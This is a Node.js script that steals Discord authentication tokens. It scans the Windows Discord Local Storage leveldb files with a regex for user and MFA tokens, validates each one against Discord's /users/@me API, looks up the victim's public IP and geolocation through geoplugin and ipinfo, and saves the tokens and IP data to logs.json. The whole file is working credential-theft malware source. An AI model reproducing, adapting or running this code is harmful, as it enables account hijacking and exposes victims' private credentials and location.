//Get module
const request = require('request');
const fs = require('fs');
const { exit } = require('process');
const { platform, homedir, type } = require('os');
const { join } = require('path');

const logJSON = JSON.parse(fs.readFileSync('./logs.json', 'utf8'));

//Check connection
request('https://google.com', function(err) {
    if(err) {console.log('No connection!');exit();}
});

console.log("Grab Token...");

function save() {
    fs.writeFile('./logs.json', JSON.stringify(logJSON,null,1), err => {
        if(err) return;
    });
};

logJSON["token"] = {};
logJSON["ipInfo"] = {};
save();

function getPath() {
    let x;
    switch(platform()) {
        case "win32":
            x = join(homedir(), "AppData", "Roaming");
            return x;
            break;
    }
}

let b = [];
let IP_INFO;

const grabToken = new Promise((resolve, reject) =>  {
    let r = /[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}/g;
    let t = join(getPath(), "\\discord\\Local Storage\\leveldb\\");
    if(!fs.existsSync(t)) {{console.log("Discord is not installed!");exit();}};
    fs.readdir(t, (err, files) => {
        if(err) {console.log("An error has occurred!");}
        let y = files.filter(f => f.split(".").pop() === "ldb");
        y.forEach(f => {
            let a = join(t, f);
            try {
                fs.readFile(a, 'utf8', (err, data) => {
                    if(err) return;
                    let p = ((data || '').match(r) || []);
                    if(String(p) === "") return;
                    if(p) {
                        p.forEach((da, i) => {
                            i++
                            function callback(err, res, body) {
                                if(err) return;
                                if (typeof body === undefined) {return;}
                                let json = JSON.parse(res.body);
                                if(json.message) { return; }
                                b.push(da);
                                if(i == p.length) { resolve(); }
                            }
                            let op = {
                                url: 'https://discordapp.com/api/v6/users/@me',
                                headers: {
                                    'Authorization': da
                                }
                            }
                            request(op,callback)
                        });
                        return;
                    }
                    resolve();
                    return;
                })
            } catch { resolve(); }
        })
    });
})

const grabIP = new Promise((resolve, reject) => {
    request('http://www.geoplugin.net/json.gp', (err, res) => {
        if(err) reject();
        let ip = JSON.parse(res.body).geoplugin_request;
        let url = "https://ipinfo.io/" + ip;
        request(url, (err, body) => {
            if (err && err.message && err.message.startsWith("Unexpected token")) {
                resolve();
            }
            let result = JSON.parse(body.body);
            delete result.readme;
            IP_INFO = result;
            resolve();
        })
    })
})

grabToken.then(() => {
    console.log("Grab ip...");
    grabIP.then(() => {
            logJSON["token"] = {
                b
            }
            logJSON["ipInfo"] = {
                IP_INFO
            }
        save();
        console.log("Finish ! Check logs.json");
    })
});
